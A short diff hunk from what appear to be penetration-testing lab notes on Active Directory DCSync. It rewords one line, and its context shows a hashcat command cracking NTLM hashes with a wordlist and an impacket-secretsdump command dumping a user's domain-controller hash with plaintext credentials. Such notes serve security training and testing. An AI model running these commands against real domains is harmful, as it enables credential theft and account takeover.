@@ -19,7 +19,7 @@ crack the hash
 hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-Using an account with these permissions
+Using an account with these permissions, ntds hashes will be dumped
 ```bash
 impacket-secretsdump -just-dc-user michelle corp.com/corpadmin:"password123\!"@192.168.0.25
 ```
